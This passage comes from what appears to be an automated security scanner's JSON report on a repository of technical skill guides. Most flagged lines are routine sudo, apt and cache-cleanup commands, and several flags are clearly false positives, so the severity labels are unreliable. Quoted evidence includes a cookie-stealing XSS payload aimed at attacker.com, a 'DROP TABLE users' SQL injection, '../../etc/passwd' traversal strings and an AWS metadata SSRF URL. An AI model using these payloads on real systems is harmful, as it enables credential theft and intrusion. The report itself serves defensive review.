      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 154,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i eth0",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 157,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 160,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump host api.example.com",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 163,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump port 443",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 164,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump port 80 or port 443",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 167,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any -A 'tcp port 80'",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 171,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any port 53",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 174,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any -w /tmp/capture.pcap",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 180,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -tttt -i any port 443",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 183,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -c 100 -i any",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 186,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -v -i any host api.example.com",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 189,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump src 192.168.1.10",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 190,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump dst 10.0.0.5",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 193,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0'",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 196,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump 'tcp[tcpflags] & tcp-rst != 0'",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 199,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump host 192.168.1.10 and host 10.0.0.5",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 202,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any port not 22",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 205,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -s 65535 -i any -w /tmp/full-capture.pcap",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 208,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any -A 'host api.example.com and port 443' -w /tmp/api-debug.pcap",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 421,
      "issue": "Privilege escalation",
      "evidence": "sudo ping -f api.example.com",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 518,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get update && sudo apt-get install -y \\",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 601,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any -w /tmp/capture.pcap  # Fills disk!",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 604,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any -c 1000 -w /tmp/capture.pcap  # 1000 packets",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/network-debugging.md",
      "line_number": 605,
      "issue": "Privilege escalation",
      "evidence": "sudo tcpdump -i any -G 60 -w /tmp/capture.pcap    # 60 seconds",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/memory-leak-debugging.md",
      "line_number": 470,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install heaptrack heaptrack-gui",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/performance-profiling.md",
      "line_number": 109,
      "issue": "Privilege escalation",
      "evidence": "sudo perf record -F 99 -g -a -- sleep 30",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/performance-profiling.md",
      "line_number": 349,
      "issue": "Privilege escalation",
      "evidence": "sudo dtrace -x ustackframes=100 -n 'profile-997 /pid == <pid>/ { @[ustack()] = count(); }' -o out.stacks",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/performance-profiling.md",
      "line_number": 428,
      "issue": "Privilege escalation",
      "evidence": "sudo iotop -o  # Only show processes doing I/O",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/performance-profiling.md",
      "line_number": 434,
      "issue": "Privilege escalation",
      "evidence": "sudo perf trace -p <pid>",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/performance-profiling.md",
      "line_number": 485,
      "issue": "Privilege escalation",
      "evidence": "sudo perf lock record -p <pid> -- sleep 30",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/performance-profiling.md",
      "line_number": 488,
      "issue": "Privilege escalation",
      "evidence": "sudo perf lock report",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/performance-profiling.md",
      "line_number": 519,
      "issue": "Privilege escalation",
      "evidence": "sudo perf record -F 99 -g -a -- sleep 30",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/remote-debugging.md",
      "line_number": 593,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install <package>-dbg",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/debugging/remote-debugging.md",
      "line_number": 596,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install python3.11-dbg",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/ml/custom-llm-evaluation.md",
      "line_number": 302,
      "issue": "Destructive database operation",
      "evidence": "pred = self.toxicity_classifier(text[:512])[0]  # Truncate to model limit",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/ml/llm-evaluation-frameworks.md",
      "line_number": 793,
      "issue": "Unencrypted HTTP",
      "evidence": "PHOENIX_ENDPOINT = os.getenv(\"PHOENIX_ENDPOINT\", \"http://phoenix:6006/v1/traces\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/ml/huggingface/huggingface-autotrain.md",
      "line_number": 143,
      "issue": "Path traversal pattern",
      "evidence": "\"Below is an instruction...\\n\\n### Instruction:\\nWhat is Python?\\n\\n### Response:\\nPython is a programming language.\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/ml/huggingface/huggingface-autotrain.md",
      "line_number": 144,
      "issue": "Path traversal pattern",
      "evidence": "\"Below is an instruction...\\n\\n### Instruction:\\nExplain AI\\n\\n### Response:\\nAI stands for Artificial Intelligence.\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/ml/huggingface/huggingface-autotrain.md",
      "line_number": 151,
      "issue": "Path traversal pattern",
      "evidence": "\"text\": \"Below is an instruction...\\n\\n### Instruction:\\nWhat is Python?\\n\\n### Response:\\nPython is a programming language.\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/ml/huggingface/huggingface-autotrain.md",
      "line_number": 154,
      "issue": "Path traversal pattern",
      "evidence": "\"text\": \"Below is an instruction...\\n\\n### Instruction:\\nExplain AI\\n\\n### Response:\\nAI stands for Artificial Intelligence.\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/build-systems/bazel-monorepos.md",
      "line_number": 45,
      "issue": "Privilege escalation",
      "evidence": "sudo mv bazelisk-linux-amd64 /usr/local/bin/bazel",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/build-systems/gradle-jvm-builds.md",
      "line_number": 379,
      "issue": "Path traversal pattern",
      "evidence": "includeBuild(\"../shared-library\")",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/build-systems/cross-platform-builds.md",
      "line_number": 571,
      "issue": "Path traversal pattern",
      "evidence": "cmake -DCMAKE_TOOLCHAIN_FILE=../toolchain-arm64.cmake .. ; \\",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/build-systems/make-fundamentals.md",
      "line_number": 190,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf $(BUILDDIR) $(TARGET)",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/build-systems/make-fundamentals.md",
      "line_number": 351,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf $(BUILDDIR)",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/build-systems/cmake-patterns.md",
      "line_number": 605,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf build                           # Full clean - cleans build artifacts only",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/build-systems/build-optimization.md",
      "line_number": 231,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install ccache         # Linux",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/build-systems/build-optimization.md",
      "line_number": 545,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf src  # Safe: cleaning temporary build directory",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/build-systems/build-optimization.md",
      "line_number": 657,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install distcc",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/build-systems/build-optimization.md",
      "line_number": 672,
      "issue": "Privilege escalation",
      "evidence": "sudo apt install icecc",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/build-systems/maven-configuration.md",
      "line_number": 29,
      "issue": "Unencrypted HTTP",
      "evidence": "<project xmlns=\"http://maven.apache.org/POM/4.0.0\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/build-systems/maven-configuration.md",
      "line_number": 30,
      "issue": "Unencrypted HTTP",
      "evidence": "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/build-systems/maven-configuration.md",
      "line_number": 31,
      "issue": "Unencrypted HTTP",
      "evidence": "xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/build-systems/maven-configuration.md",
      "line_number": 32,
      "issue": "Unencrypted HTTP",
      "evidence": "http://maven.apache.org/xsd/maven-4.0.0.xsd\">",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/security/secrets-management.md",
      "line_number": 41,
      "issue": "Possible hardcoded password",
      "evidence": "DB_PASSWORD = \"MyP@ssw0rd123\"  # Example of what NOT to do",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/security/secrets-management.md",
      "line_number": 667,
      "issue": "Possible hardcoded password",
      "evidence": "connect(password=\"secret123\")  # Example only - never hardcode passwords",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/security/input-validation.md",
      "line_number": 400,
      "issue": "Path traversal pattern",
      "evidence": "# Attack: filename = \"../../etc/passwd\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/security/vulnerability-assessment.md",
      "line_number": 51,
      "issue": "Path traversal pattern",
      "evidence": "\"https://api.example.com/files/../../etc/passwd\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/security/vulnerability-assessment.md",
      "line_number": 126,
      "issue": "Destructive database operation",
      "evidence": "\"'; DROP TABLE users; --\",  # Example of destructive injection payload",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/security/vulnerability-assessment.md",
      "line_number": 389,
      "issue": "Possible hardcoded token",
      "evidence": "expired_token = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...\"  # Test token for security validation only",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/security/vulnerability-assessment.md",
      "line_number": 430,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://169.254.169.254/latest/meta-data/\",  # AWS metadata",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/security/security-headers.md",
      "line_number": 267,
      "issue": "Unencrypted HTTP",
      "evidence": "url = request.url.replace('http://', 'https://', 1)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/security/security-headers.md",
      "line_number": 534,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
      "line_number": 74,
      "issue": "Possible hardcoded password",
      "evidence": "SELECT * FROM users WHERE username = '$username' AND password = '$password'",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
      "line_number": 96,
      "issue": "Unencrypted HTTP",
      "evidence": "username: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
      "line_number": 182,
      "issue": "Unencrypted HTTP",
      "evidence": "- http://www.pentest-standard.org/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/security/oauth2-implementation/resources/REFERENCE.md",
      "line_number": 2584,
      "issue": "Possible hardcoded token",
      "evidence": "access_token='initial_access_token',  # Placeholder - use actual token from auth response",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/security/oauth2-implementation/resources/REFERENCE.md",
      "line_number": 2585,
      "issue": "Possible hardcoded token",
      "evidence": "refresh_token='initial_refresh_token',  # Placeholder - use actual token from auth response",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/data/etl-patterns.md",
      "line_number": 44,
      "issue": "Destructive database operation",
      "evidence": "\u2192 Pattern: TRUNCATE + INSERT or DROP + CREATE  <!-- ETL operations on target tables -->",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/data/etl-patterns.md",
      "line_number": 322,
      "issue": "Destructive database operation",
      "evidence": "conn.execute(f\"DROP TABLE {temp_table}\")",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/data/etl-patterns.md",
      "line_number": 357,
      "issue": "Destructive database operation",
      "evidence": "cursor.execute(f\"DROP TABLE {stage_table}\")",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/containers/container-security.md",
      "line_number": 255,
      "issue": "Privilege escalation",
      "evidence": "wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/containers/container-security.md",
      "line_number": 256,
      "issue": "Privilege escalation",
      "evidence": "echo \"deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main\" | sudo tee -a /etc/apt/sources.list.d/trivy.list",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/containers/container-security.md",
      "line_number": 257,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get update",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/containers/container-security.md",
      "line_number": 258,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install trivy",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/container-security.md",
      "line_number": 309,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/container-security.md",
      "line_number": 319,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/docker-compose-development.md",
      "line_number": 302,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://web:80",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/docker-compose-development.md",
      "line_number": 343,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://api:3000",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/docker-compose-development.md",
      "line_number": 344,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://api-server:3000",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/docker-compose-development.md",
      "line_number": 345,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://backend-api:3000",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/container-networking.md",
      "line_number": 69,
      "issue": "Unencrypted HTTP",
      "evidence": "docker exec web curl http://api:3000",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/container-networking.md",
      "line_number": 293,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://db:5432",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/container-networking.md",
      "line_number": 461,
      "issue": "Unencrypted HTTP",
      "evidence": "docker exec web curl http://api:3000/health",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/container-networking.md",
      "line_number": 503,
      "issue": "Unencrypted HTTP",
      "evidence": "**Symptom**: `curl https://google.com` works, `curl http://api` fails",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization.md",
      "line_number": 80,
      "issue": "Destructive file deletion",
      "evidence": "RUN rm -rf /var/lib/apt/lists/*",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization.md",
      "line_number": 90,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization.md",
      "line_number": 320,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization.md",
      "line_number": 337,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 236,
      "issue": "Destructive file deletion",
      "evidence": "&& rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 329,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 638,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/* \\  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 650,
      "issue": "Force flag usage",
      "evidence": "npm cache clean --force && \\",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 651,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /root/.npm",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 796,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 809,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 827,
      "issue": "Force flag usage",
      "evidence": "npm cache clean --force",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 1224,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 1260,
      "issue": "Destructive file deletion",
      "evidence": "RUN rm -rf /var/lib/apt/lists/*",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 1271,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 1423,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 1551,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
      "line_number": 1952,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/production-incident-debugging.md",
      "line_number": 205,
      "issue": "Unencrypted HTTP",
      "evidence": "response = requests.post('http://inventory-service/check', headers=headers)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/production-incident-debugging.md",
      "line_number": 509,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.post('http://service-a/api')",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/production-incident-debugging.md",
      "line_number": 512,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.post('http://service-b/api')",
      "recommendation": "Use HTTPS for external resources"
    },
    {
